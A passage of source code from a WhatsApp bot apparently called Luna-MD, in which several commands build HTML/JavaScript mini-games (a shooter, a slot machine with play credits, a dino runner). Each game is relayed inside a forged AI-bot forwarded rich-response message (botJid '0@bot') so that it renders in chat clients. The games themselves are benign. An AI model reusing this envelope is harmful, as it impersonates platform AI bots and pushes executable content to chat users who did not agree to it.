      ctx.globalAlpha = Math.random() * 0.5 + 0.5;
      ctx.fillRect(st.x, st.y, st.size, st.size);
    }
    ctx.globalAlpha = 1;
    if (!gameOver) {
      playerX += (targetX - playerX) * 0.25;
      shootTimer++;
      if (shootTimer >= 10) {
        bullets.push({ x: playerX - 12, y: playerY - 10, speed: 8 });
        bullets.push({ x: playerX + 12, y: playerY - 10, speed: 8 });
        shootTimer = 0;
      }
      spawnCounter++;
      if (spawnCounter > 35) {
        spawnEnemy();
        spawnCounter = 0;
      }
      if (comboTimer > 0) comboTimer--; else if (combo > 1) combo = 1;
    }
    ctx.fillStyle = '#38bdf8';
    for (var b = bullets.length - 1; b >= 0; b--) {
      var bl = bullets[b];
      if (!gameOver) bl.y -= bl.speed;
      ctx.fillRect(bl.x - 1.5, bl.y, 3, 10);
      if (bl.y < -10) bullets.splice(b, 1);
    }
    for (var e = enemies.length - 1; e >= 0; e--) {
      var en = enemies[e];
      if (!gameOver) en.y += en.speed;
      if (en.isMeteor) {
        drawMeteor(en.x, en.y, en.w);
      } else {
        drawAlien(en.x, en.y);
      }
      for (var b = bullets.length - 1; b >= 0; b--) {
        var bl = bullets[b];
        if (Math.abs(bl.x - en.x) < en.w / 2 + 2 && Math.abs(bl.y - en.y) < en.h / 2 + 5) {
          bullets.splice(b, 1);
          en.hp--;
          explode(bl.x, bl.y, en.isMeteor ? '#78350f' : '#10b981', 6);
          if (en.hp <= 0) {
            kills++;
            score += 50 * combo;
            combo = Math.min(combo + 1, 9);
            comboTimer = 90;
            coins.push({ x: en.x, y: en.y, r: 8, spin: 0 });
            explode(en.x, en.y, '#10b981', 15);
            enemies.splice(e, 1);
            break;
          }
        }
      }
      if (!en) continue;
      if (!gameOver && Math.abs(playerX - en.x) < 22 && Math.abs(playerY - en.y) < 22) {
        gameOver = true;
        shake = 12;
        flashAlpha = 0.5;
        explode(playerX, playerY, '#3b82f6', 25);
        explode(en.x, en.y, en.isMeteor ? '#78350f' : '#10b981', 25);
      }
      if (en.y > H + 40) enemies.splice(e, 1);
    }
    for (var c = coins.length - 1; c >= 0; c--) {
      var cn = coins[c];
      if (!gameOver) { cn.y += 2.5; cn.spin += 0.15; }
      var squash = Math.abs(Math.cos(cn.spin));
      ctx.save();
      ctx.translate(cn.x, cn.y);
      ctx.scale(Math.max(0.2, squash), 1);
      ctx.fillStyle = '#fbbf24';
      ctx.beginPath();
      ctx.arc(0, 0, cn.r, 0, Math.PI * 2);
      ctx.fill();
      ctx.restore();
      if (!gameOver && Math.abs(playerX - cn.x) < 20 && Math.abs(playerY - cn.y) < 20) {
        coinCount++;
        score += 30;
        explode(cn.x, cn.y, '#fbbf24', 8);
        coins.splice(c, 1);
      } else if (cn.y > H + 20) {
        coins.splice(c, 1);
      }
    }
    if (!gameOver) {
      drawSpaceCraft(playerX, playerY);
    }
    for (var p = particles.length - 1; p >= 0; p--) {
      var pt = particles[p];
      pt.x += pt.vx;
      pt.y += pt.vy;
      pt.life -= 0.05;
      if (pt.life <= 0) { particles.splice(p, 1); continue; }
      ctx.globalAlpha = Math.max(pt.life, 0);
      ctx.fillStyle = pt.color;
      ctx.beginPath();
      ctx.arc(pt.x, pt.y, pt.size, 0, Math.PI * 2);
      ctx.fill();
      ctx.globalAlpha = 1;
    }
    if (flashAlpha > 0.01) {
      ctx.fillStyle = 'rgba(255,255,255,' + flashAlpha + ')';
      ctx.fillRect(0, 0, W, H);
      flashAlpha *= 0.85;
    }
    scoreEl.textContent = String(score).padStart(4, '0');
    if (score > best) {
      best = score;
      try { localStorage.setItem('plane_best_v1', String(best)); } catch(e){}
      bestEl.textContent = 'BEST ' + String(best).padStart(4, '0');
    }
    killsStatEl.textContent = kills;
    comboStatEl.textContent = 'x' + combo;
    coinsStatEl.textContent = coinCount;
    if (gameOver) {
      ctx.fillStyle = 'rgba(7, 10, 18, 0.85)';
      ctx.fillRect(0, 0, W, H);
      ctx.textAlign = 'center';
      ctx.fillStyle = '#ef4444';
      ctx.font = '900 24px sans-serif';
      ctx.fillText('DESTROYED 💥', W / 2, H / 2 - 25);
      ctx.fillStyle = '#ffffff';
      ctx.font = '800 14px sans-serif';
      ctx.fillText('Score: ' + score, W / 2, H / 2 - 2);
      ctx.fillStyle = '#94a3b8';
      ctx.font = '600 11px sans-serif';
      ctx.fillText('Kills: ' + kills + '  •  Coins: ' + coinCount, W / 2, H / 2 + 18);
      ctx.fillStyle = '#38bdf8';
      ctx.font = '700 12px sans-serif';
      ctx.fillText('TAP TO RESTART', W / 2, H / 2 + 42);
    }
    ctx.restore();
    requestAnimationFrame(update);
  }
  function moveLeft() {
    if (gameOver) return;
    if (currentLane > 0) currentLane--;
    targetX = lanes[currentLane];
  }
  function moveRight() {
    if (gameOver) return;
    if (currentLane < lanes.length - 1) currentLane++;
    targetX = lanes[currentLane];
  }
  function restart() {
    score = 0;
    kills = 0;
    coinCount = 0;
    combo = 1;
    comboTimer = 0;
    bullets = [];
    enemies = [];
    coins = [];
    particles = [];
    currentLane = 1;
    targetX = lanes[currentLane];
    playerX = lanes[currentLane];
    gameOver = false;
  }
  function addTapEvent(id, fn) {
    var el = document.getElementById(id);
    if (!el) return;
    el.addEventListener('pointerdown', function(e) { e.preventDefault(); fn(); });
  }
  addTapEvent('leftBtn', moveLeft);
  addTapEvent('rightBtn', moveRight);
  function handleCanvasTap(e) {
    e.preventDefault();
    if (gameOver) { restart(); return; }
    var rect = cvs.getBoundingClientRect();
    var clientX = e.clientX;
    if (e.touches && e.touches.length > 0) clientX = e.touches[0].clientX;
    var clickX = (clientX - rect.left) * (W / rect.width);
    if (clickX < W / 2) moveLeft(); else moveRight();
  }
  cvs.addEventListener('pointerdown', handleCanvasTap);
  update();
})();
</script>
</body>
</html>
`

const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
)
}
break

case "slot777": {
const html = `<style>
*{box-sizing:border-box;margin:0;font-family:'Segoe UI',Arial,sans-serif;user-select:none;-webkit-user-select:none;-webkit-tap-highlight-color:transparent}
html,body{width:100%}
body{background:radial-gradient(circle at 50% 8%,#1d6a50,#0f4938 48%,#07291f);padding:9px;color:#e9e3bc;overflow-y:auto}
.machine{width:100%;max-width:420px;margin:0 auto;position:relative;padding:10px 12px 12px;border:4px solid #b9954d;border-radius:26px;background:linear-gradient(110deg,#061e17,#1b644b 12%,#0b382a 30%,#15543f 55%,#092f24 80%,#28775a 94%,#071f18);box-shadow:inset 0 0 0 3px #163f31,inset 0 16px 26px #73d2a31f,0 8px 0 #041a13,0 16px 24px #000c}
.lights{height:9px;margin:0 12px 7px;border:2px solid #123d2f;border-radius:8px;background:repeating-radial-gradient(circle at 6px 50%,#dfffdc 0 2px,#82c878 3px 5px,#164936 6px 12px);box-shadow:0 0 12px #67b881;animation:blink .55s steps(2) infinite}
.title{padding:10px 4px 8px;border:3px solid #b99a54;border-radius:16px 16px 11px 11px;color:#e9e3bc;background:radial-gradient(ellipse at 50% 0,#2b8a6c,#11513f 60%,#082a24);text-align:center;font:900 25px Impact,'Arial Black',sans-serif;letter-spacing:1px;text-shadow:0 3px #193f31,0 0 12px #7ddc8a66}
.jack{width:76%;margin:6px auto;padding:3px;border:2px solid #a98c4d;border-radius:9px;color:#ded7ad;background:linear-gradient(#245d48,#0b3025);text-align:center;font:bold 10px monospace;letter-spacing:1px}
.stats{display:flex;margin:0 2px 8px;padding:5px;border:2px solid #537d64;border-radius:9px;background:linear-gradient(#102d24,#061812);box-shadow:inset 0 0 9px #000}
.stats div{flex:1;border-right:1px solid #416452;text-align:center;font:bold 10px monospace;color:#91b59f}
.stats div:last-child{border:0}
.stats b{display:block;margin-top:2px;font-size:15px;color:#e3dfbb;text-shadow:0 0 6px #62a77d}
.frame{padding:8px;border:4px solid #315c47;border-radius:16px;background:linear-gradient(90deg,#09271e,#b49a59 5%,#174936 10%,#174936 90%,#b49a59 95%,#09271e);box-shadow:inset 0 0 0 3px #071b15,0 4px 0 #09271e,0 8px 15px #000a}
#reels{display:grid;grid-template-columns:repeat(5,1fr);height:192px;overflow:hidden;border:3px solid #071c15;border-radius:10px;background:#071a14;box-shadow:inset 0 12px 18px #0009,inset 0 -12px 18px #0009}
.reel{position:relative;overflow:hidden;background:linear-gradient(90deg,#8f6a39,#fff8d8 17%,#fffdf0 50%,#f0dfad 82%,#79552c);box-shadow:inset 7px 0 8px #573b1d55,inset -7px 0 8px #573b1d55}
.reel+.reel{border-left:2px solid #573512}
.reel:after{content:"";position:absolute;inset:0;pointer-events:none;background:linear-gradient(#1c0d05bb 0,transparent 18%,transparent 80%,#281208cc 100%)}
.strip{will-change:transform}
.strip.moving{filter:blur(1.4px) saturate(1.2)}
.sym{height:64px;display:flex;align-items:center;justify-content:center;border-bottom:1px solid #9f7e4f44;font-family:'Apple Color Emoji','Segoe UI Emoji',sans-serif;font-size:40px;line-height:1;text-shadow:0 3px 0 #72101822,0 0 4px #fff}
.s7{font:900 42px Impact,'Arial Black',sans-serif;color:#ef1726;-webkit-text-stroke:2px #850815;text-shadow:0 3px #5d0509,0 0 5px #fff}
.sbar{width:52px;height:22px;display:flex;align-items:center;justify-content:center;font:900 12px 'Arial Black',sans-serif;color:#fff4c4;background:radial-gradient(ellipse at center,#e22d35 0,#6f0910 55%,transparent 56%);text-shadow:0 2px #401010}
.win{animation:winP .5s ease-in-out infinite;background:radial-gradient(circle,#fff8a9,#ffae00 55%,transparent 72%)}
@keyframes winP{50%{transform:scale(1.09);filter:brightness(1.4)}}
.message{height:34px;margin:9px 2px 7px;display:flex;align-items:center;justify-content:center;border:2px solid #537d64;border-radius:8px;background:linear-gradient(#102d24,#061812);box-shadow:inset 0 0 8px #000;color:#e3dfbb;font:bold 14px monospace;text-shadow:0 0 7px #62a77d;text-align:center}
.console{display:grid;grid-template-columns:46px 1fr 1.8fr;gap:8px;margin:0 3px;padding:9px 8px 11px;border:3px solid #416a53;border-radius:9px 9px 16px 16px;background:linear-gradient(#9c8c59,#315d48 37%,#0a2e22 39%,#123e2f);box-shadow:inset 0 2px #d9c992,0 6px #061d16,0 12px 18px #0009}
button{height:53px;border:3px solid #0b2e22;border-radius:13px;color:#fff;font-weight:900;cursor:pointer;touch-action:manipulation}
.mute{background:linear-gradient(#d9b04a,#8a6d08 55%,#5d4805);box-shadow:0 4px #3d2f02;font-size:18px}
.bet{background:linear-gradient(#4f9a77,#216348 53%,#103d2d);box-shadow:inset 0 4px 4px #d8ffe055,0 4px #092a20}
.spin{background:radial-gradient(circle at 50% 32%,#a8d96f,#4b8d46 47%,#1e542f 76%);box-shadow:inset 0 4px 5px #e8ffd488,0 4px #12351e,0 0 14px #79b85c88;font-size:18px;text-shadow:0 2px #06420d}
button:disabled{filter:saturate(.4) brightness(.75)}
.tray{width:48%;height:17px;margin:13px auto 0;border:4px solid #244d3a;border-radius:4px 4px 10px 10px;background:#061a13;box-shadow:inset 0 6px 9px #000,0 3px #897945}
.winner .lights{animation-duration:.16s}
.winner .title{animation:winP .6s ease-in-out 2}
.over{position:absolute;inset:0;z-index:10;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:7px;border-radius:20px;background:#03150eec;color:#ffe5a0;text-align:center}
.over.off{display:none}
.over h2{margin:0 0 6px;font-size:24px;color:#ff3449;text-shadow:0 0 12px #f00}
.over p{font-size:13px;color:#cfe6c8}
.over button{padding:0 22px;height:40px;background:#ffd15a;color:#271204}
@keyframes blink{50%{filter:brightness(1.7)}}
</style>
<div class="machine" id="machine">
<div class="lights"></div>
<div class="title">FRUIT BONANZA</div>
<div class="jack">JACKPOT · 10.000 CREDITS</div>
<div class="stats"><div>CREDITS<b id="credits">500</b></div><div>BET<b id="betValue">10</b></div><div>BEST WIN<b id="best">0</b></div></div>
<div class="frame"><div id="reels"></div></div>
<div id="message" class="message">SPIN UNTUK MULAI</div>
<div class="console"><button id="mute" class="mute">🔊</button><button id="bet" class="bet">BET +</button><button id="spin" class="spin">🎰 SPIN</button></div>
<div class="tray"></div>
<div id="over" class="over off"><h2>GAME OVER</h2><p>Credits habis!<br>Best Win: <b id="finalBest">0</b></p><button id="restart">MAIN LAGI</button></div>
</div>
<script>
(function(){
var AC=null,MUTED=false;
try{MUTED=localStorage.getItem('slot_mute')==='1'}catch(e){}
function ac(){if(!AC){try{AC=new(window.AudioContext||window.webkitAudioContext)()}catch(e){return null}}if(AC.state==='suspended'){try{AC.resume()}catch(e){}}return AC;}
function tone(f,dur,type,vol,delay,slide){var a=ac();if(!a||MUTED)return;try{var t=a.currentTime+(delay||0),o=a.createOscillator(),g=a.createGain();o.type=type||'square';o.frequency.setValueAtTime(f,t);if(slide)o.frequency.exponentialRampToValueAtTime(slide,t+dur);g.gain.setValueAtTime(vol||.12,t);g.gain.exponentialRampToValueAtTime(.0001,t+dur);o.connect(g);g.connect(a.destination);o.start(t);o.stop(t+dur+.03);}catch(e){}}
function sndClick(){tone(650,.05,'square',.08)}
function sndSpin(){tone(700,.28,'sawtooth',.06,0,150);for(var i=0;i<8;i++)tone(170,.03,'square',.05,.1+i*.1)}
function sndStop(c){tone(150+c*35,.09,'square',.16)}
function sndWin(){[660,880,1100].forEach(function(f,i){tone(f,.14,'triangle',.14,i*.09)})}
function sndJackpot(){[523,659,784,1046,784,1046,1318,1568].forEach(function(f,i){tone(f,.16,'square',.12,i*.11);tone(f/2,.16,'triangle',.08,i*.11)})}
function sndLose(){tone(220,.2,'sawtooth',.07);tone(160,.3,'sawtooth',.07,.14)}
function sndOver(){[392,330,262,196].forEach(function(f,i){tone(f,.3,'triangle',.12,i*.28)})}
document.addEventListener('pointerdown',function(){ac()},{once:true});
var SY=['🍒','🍋','🔔','💎','7','BAR'],WT=[30,25,18,12,8,7],PAY=[2,3,5,8,12,20],SH=64,LEN=10,OFF=7,credits=500,bet=10,best=0,busy=false,reels=[],C=document.getElementById('credits'),BV=document.getElementById('betValue'),BS=document.getElementById('best'),MSG=document.getElementById('message'),SP=document.getElementById('spin'),BT=document.getElementById('bet'),MUB=document.getElementById('mute'),OV=document.getElementById('over'),FB=document.getElementById('finalBest'),MCH=document.getElementById('machine');
function pick(){var n=Math.random()*100,s=0;for(var i=0;i<6;i++){s+=WT[i];if(n<s)return i}return 0}
function symHTML(v){return '<div class="sym">'+(v===4?'<i class="s7">7</i>':v===5?'<i class="sbar">BAR</i>':SY[v])+'</div>'}
function ui(){C.textContent=credits;BV.textContent=bet;BS.textContent=best}
function msg(t){MSG.textContent=t}
function clearWin(){for(var c=0;c<5;c++)for(var i=OFF;i<LEN;i++)reels[c].strip.children[i].classList.remove('win')}
function spin(){if(busy||credits<bet)return;busy=true;clearWin();credits-=bet;ui();SP.disabled=true;BT.disabled=true;msg('GOOD LUCK ✨');sndSpin();for(var c=0;c<5;c++){var r=reels[c],vals=[],h='';for(var i=0;i<LEN;i++)vals.push(pick());for(var j=0;j<LEN;j++)h+=symHTML(vals[j]);r.vals=vals;r.strip.innerHTML=h;r.strip.style.transition='none';r.strip.style.transform='translateY(0)';r.strip.offsetHeight;var dur=1.05+c*0.22;r.strip.classList.add('moving');r.strip.style.transition='transform '+dur+'s cubic-bezier(.12,.75,.25,1)';r.strip.style.transform='translateY(-'+(OFF*SH)+'px)';(function(st,d,ix){setTimeout(function(){st.classList.remove('moving');sndStop(ix)},d*1000)})(r.strip,dur,c)}setTimeout(evalBoard,2150)}
function evalBoard(){var grid=[];for(var c=0;c<5;c++)grid.push(reels[c].vals.slice(OFF));var lines=[[0,0,0,0,0],[1,1,1,1,1],[2,2,2,2,2],[0,1,2,1,0],[2,1,0,1,2]],total=0,wc=[];lines.forEach(function(p){var a=grid[0][p[0]],n=1;for(var x=1;x<5&&grid[x][p[x]]===a;x++)n++;if(n>=3){total+=Math.floor(bet*PAY[a]*(n===3?1:n===4?2:5));for(var i=0;i<n;i++)wc.push([i,p[i]])}});if(total){credits+=total;best=Math.max(best,total);wc.forEach(function(w){reels[w[0]].strip.children[OFF+w[1]].classList.add('win')});msg(total>=bet*20?'🎰 JACKPOT +'+total:'✨ MENANG +'+total);MCH.classList.add('winner');setTimeout(function(){MCH.classList.remove('winner')},1800);if(total>=bet*20)sndJackpot();else sndWin()}else{msg('💦 BELUM HOKI!');sndLose()}SP.disabled=false;BT.disabled=false;busy=false;ui();if(credits<10)setTimeout(gameover,900);else if(bet>credits){bet=10;ui()}}
function gameover(){FB.textContent=best;OV.className='over';sndOver()}
BT.onclick=function(){if(busy)return;sndClick();bet=bet===10?20:bet===20?50:10;if(bet>credits)bet=10;ui()};SP.onclick=spin;MUB.onclick=function(){MUTED=!MUTED;MUB.textContent=MUTED?'🔇':'🔊';try{localStorage.setItem('slot_mute',MUTED?'1':'0')}catch(e){}if(!MUTED)sndClick()};if(MUTED)MUB.textContent='🔇';
document.getElementById('restart').onclick=function(){sndClick();credits=500;bet=10;best=0;busy=false;OV.className='over off';msg('SPIN UNTUK MULAI');SP.disabled=false;BT.disabled=false;clearWin();ui()};
var box=document.getElementById('reels');for(var c=0;c<5;c++){var d=document.createElement('div');d.className='reel';var s=document.createElement('div');s.className='strip';d.appendChild(s);box.appendChild(d);var h='';for(var i=0;i<LEN;i++)h+=symHTML(pick());s.innerHTML=h;s.style.transform='translateY(-'+(OFF*SH)+'px)';reels.push({strip:s,vals:[0,0,0]})}ui();
})();
\n/* RIMURU LIGHT SFX: procedural WebAudio, no external audio asset */
(function(){
  if (window.__RIMURU_LIGHT_SFX__) return;
  var ac=null, master=null, last=0;
  function init(){
    try{
      if(!ac){
        var C=window.AudioContext||window.webkitAudioContext;
        if(!C) return null;
        ac=new C();
        master=ac.createGain();
        master.gain.value=0.055;
        master.connect(ac.destination);
      }
      if(ac.state==='suspended') ac.resume();
      return ac;
    }catch(_){ return null; }
  }
  function tone(freq,dur,type,vol,when){
    var c=init(); if(!c||!master) return;
    var now=c.currentTime+(when||0), o=c.createOscillator(), g=c.createGain();
    o.type=type||'sine';
    o.frequency.setValueAtTime(freq,now);
    g.gain.setValueAtTime(0.0001,now);
    g.gain.exponentialRampToValueAtTime(Math.max(0.0001,vol||0.12),now+0.008);
    g.gain.exponentialRampToValueAtTime(0.0001,now+(dur||0.07));
    o.connect(g); g.connect(master); o.start(now); o.stop(now+(dur||0.07)+0.015);
  }
  function cool(now){
    var t=Date.now(); if(t-last<now) return false; last=t; return true;
  }
  var api={
    init:init,
    tap:function(){ if(cool(28)) tone(520,0.045,'square',0.055); },
    move:function(){ if(cool(24)) tone(300,0.035,'triangle',0.045); },
    rotate:function(){ if(cool(24)) tone(430,0.05,'triangle',0.05); },
    drop:function(){ if(cool(20)) tone(180,0.055,'square',0.05); },
    score:function(){ if(cool(18)) { tone(660,0.055,'sine',0.055); tone(880,0.055,'sine',0.04,0.045); } },
    line:function(){ if(cool(35)) { tone(740,0.06,'sine',0.06); tone(1040,0.09,'sine',0.045,0.05); } },
    win:function(){ if(cool(60)) { tone(523,0.08,'sine',0.06); tone(659,0.08,'sine',0.05,0.07); tone(784,0.12,'sine',0.045,0.14); } },
    over:function(){ if(cool(60)) { tone(392,0.09,'sawtooth',0.055); tone(294,0.12,'sawtooth',0.04,0.08); } }
  };
  window.__RIMURU_LIGHT_SFX__=api;

  function num(el){
    var s=(el.textContent||'').replace(/,/g,'').match(/-?\d+(?:\.\d+)?/);
    return s?Number(s[0]):null;
  }
  function bindValue(el){
    var lastVal=num(el);
    var mo=new MutationObserver(function(){
      var n=num(el);
      if(n===null || lastVal===null){ lastVal=n; return; }
      if(n>lastVal){
        var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
        if(/line|combo|clear|level|stage/.test(id)) api.line(); else api.score();
      } else if(n<lastVal && /life|hp|health|lives|heart/.test(((el.id||'')+' '+(el.className||'')).toLowerCase())) api.over();
      lastVal=n;
    });
    mo.observe(el,{subtree:true,childList:true,characterData:true});
  }
  function bindState(el){
    var prev=(el.textContent||'').toLowerCase(), prevCls=el.className||'';
    var mo=new MutationObserver(function(){
      var txt=(el.textContent||'').toLowerCase(), cls=el.className||'';
      var joined=txt+' '+cls.toLowerCase();
      if(joined!==prev+' '+prevCls.toLowerCase()){
        if(/game over|gameover|kalah|selesai|you lose|lose|mati|gagal|over/.test(joined)) api.over();
        else if(/menang|menang!|you win|winner|victory|berhasil|selamat/.test(joined)) api.win();
        prev=txt; prevCls=cls;
      }
    });
    mo.observe(el,{subtree:true,childList:true,characterData:true,attributes:true,attributeFilter:['class','style','hidden','aria-hidden']});
  }
  document.addEventListener('pointerdown',function(){ api.init(); api.tap(); },{passive:true,capture:true});
  document.addEventListener('keydown',function(e){
    api.init();
    var k=e.key;
    if(/^Arrow(Left|Right|Up|Down)$/.test(k) || /^(a|d|w|s)$/i.test(k)) api.move();
    else if(k===' ' || k==='Enter') api.tap();
  },{passive:true,capture:true});
  document.addEventListener('DOMContentLoaded',function(){
    document.querySelectorAll('[id]').forEach(function(el){
      var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
      if(/score|points|lines|combo|level|stage|best|coin/.test(id)) bindValue(el);
      if(/over|result|status|message|state|win|lose|modal/.test(id)) bindState(el);
    });
  });
  if(document.readyState!=='loading'){
    document.querySelectorAll('[id]').forEach(function(el){
      var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
      if(/score|points|lines|combo|level|stage|best|coin/.test(id)) bindValue(el);
      if(/over|result|status|message|state|win|lose|modal/.test(id)) bindState(el);
    });
  }
})();
</script>`

const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
)
}
break

case "dino": {
const html = `<style>*{-webkit-tap-highlight-color:transparent;-webkit-user-select:none;user-select:none;-webkit-touch-callout:none}</style>
<body style="margin:0;background:transparent;font-family:Arial,sans-serif;color:#eee;touch-action:manipulation;cursor:pointer">
<div style="width:100%;max-width:620px;margin:auto;padding:16px;box-sizing:border-box">
<div style="background:rgba(255,255,255,.06);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border:1px solid rgba(255,255,255,.15);border-radius:16px;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,.35)">
<div style="padding:18px 20px;border-bottom:1px solid rgba(255,255,255,.12);display:flex;justify-content:space-between;align-items:center">
<div><div style="font-size:11px;letter-spacing:1.5px;color:rgba(255,255,255,.45)">Luna-MD</div><div style="font-size:21px;font-weight:bold;color:#fff">Dino Runner</div></div>
<div style="text-align:right"><div id="score" style="font-size:18px;font-weight:bold;color:#fff;text-shadow:0 0 10px rgba(108,92,231,.85);transition:transform .15s">00000</div><div id="best" style="font-size:10px;color:rgba(255,255,255,.4);margin-top:2px">BEST 00000</div></div>
</div>
<div style="padding:18px">
<canvas id="game" width="560" height="190" style="width:100%;height:auto;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.12);border-radius:12px;display:block"></canvas>
<div id="status" style="text-align:center;margin-top:10px;font-size:12px;color:rgba(255,255,255,.55)">Speed 5.0x</div>
</div></div></div>
<script>
const c=document.getElementById('game'),x=c.getContext('2d'),scoreEl=document.getElementById('score'),bestEl=document.getElementById('best'),statusEl=document.getElementById('status');
const GY=170;
let d,o,clouds,particles,ambient,trail,score,best=0,speed,gameOver,last,shake,flash,runT,spawnTimer,milestone,squash;
function loadBest(){
let vals=[];
try{let v=localStorage.getItem('dino_best');if(v)vals.push(parseInt(v,10))}catch(e){}
try{let v=sessionStorage.getItem('dino_best');if(v)vals.push(parseInt(v,10))}catch(e){}
try{let m=document.cookie.match(/(?:^|;s*)dino_best=(d+)/);if(m)vals.push(parseInt(m[1],10))}catch(e){}
return vals.length?Math.max(...vals.filter(v=>!isNaN(v))):0
}
function saveBest(v){
let val=String(Math.floor(v));
try{localStorage.setItem('dino_best',val)}catch(e){}
try{sessionStorage.setItem('dino_best',val)}catch(e){}
try{document.cookie='dino_best='+val+';max-age=31536000;path=/'}catch(e){}
try{
let rq=indexedDB.open('dino_db',1);
rq.onupgradeneeded=()=>{rq.result.createObjectStore('kv')};
rq.onsuccess=()=>{try{rq.result.transaction('kv','readwrite').objectStore('kv').put(val,'dino_best')}catch(e){}}
}catch(e){}
}
function loadBestAsync(cb){
try{
let rq=indexedDB.open('dino_db',1);
rq.onupgradeneeded=()=>{rq.result.createObjectStore('kv')};
rq.onsuccess=()=>{
try{
let gr=rq.result.transaction('kv','readonly').objectStore('kv').get('dino_best');
gr.onsuccess=()=>{if(gr.result)cb(parseInt(gr.result,10))}
}catch(e){}
}
}catch(e){}
}
best=loadBest();
loadBestAsync(v=>{if(!isNaN(v)&&v>best){best=v;bestEl.textContent='BEST '+String(Math.floor(best)).padStart(5,'0')}});
function reset(){
d={x:55,y:132,w:27,h:30,vy:0,jumping:false};
o=[];
clouds=[{x:120,y:32,w:44,s:.35},{x:300,y:52,w:60,s:.22},{x:460,y:26,w:36,s:.4},{x:560,y:70,w:50,s:.18}];
particles=[];
trail=[];
if(!ambient){ambient=[];for(let i=0;i<18;i++)ambient.push({x:Math.random()*c.width,y:Math.random()*c.height,r:.5+Math.random()*1.5,vx:.1+Math.random()*.3,ph:Math.random()*10})}
score=0;speed=5;gameOver=false;last=0;shake=0;flash=0;runT=0;milestone=0;squash=1;
spawnTimer=70+Math.random()*30;
bestEl.textContent='BEST '+String(Math.floor(best)).padStart(5,'0');
statusEl.textContent='Speed 5.0x'
}
function burst(px,py,n,col,spd){for(let i=0;i<n;i++)particles.push({x:px,y:py,vx:(Math.random()-.5)*spd,vy:-Math.random()*spd,life:1,col,size:2+Math.random()*2})}
function jumpDino(){
if(gameOver){reset();return}
if(!d.jumping){d.jumping=true;d.vy=-13;squash=.7;burst(d.x+13,d.y+30,10,'255,255,255',4)}
}
function cactus(){
let h=24+Math.random()*24;
o.push({x:c.width+20,y:GY-h,w:16+Math.random()*6,h});
if(Math.random()<.22){o.push({x:c.width+20+34+Math.random()*10,y:GY-(20+Math.random()*18),w:16,h:20+Math.random()*18})}
}
function hit(a,b){return a.x+4<b.x+b.w&&a.x+a.w-4>b.x&&a.y+4<b.y+b.h&&a.y+a.h>b.y}
function drawTrail(){
trail.forEach((p,i)=>{x.fillStyle='rgba(108,92,231,'+(.25*(i/trail.length))+')';x.fillRect(p.x,p.y,27,30)})
}
function drawDino(){
x.save();
let cx=d.x+13,cy=d.y+30;
x.translate(cx,cy);
x.scale(1/squash,squash);
x.translate(-cx,-cy);
let legOff=d.jumping?0:Math.sin(runT*.5)*5;
x.fillStyle='#eaeaea';
x.fillRect(d.x,d.y,27,30);
x.fillRect(d.x+22,d.y+5,13,18);
x.fillStyle='#6c5ce7';
x.fillRect(d.x+29,d.y+8,4,4);
x.fillStyle='#eaeaea';
x.fillRect(d.x+5,d.y+30,6,8+legOff);
x.fillRect(d.x+20,d.y+30,6,8-legOff);
x.restore()
}
function drawCactus(q){
x.save();
x.shadowColor='rgba(255,90,90,.35)';x.shadowBlur=10;
x.fillStyle='#e17a7a';
x.fillRect(q.x,q.y,q.w,q.h);
x.fillRect(q.x-7,q.y+10,7,6);
x.fillRect(q.x-7,q.y+4,6,12);
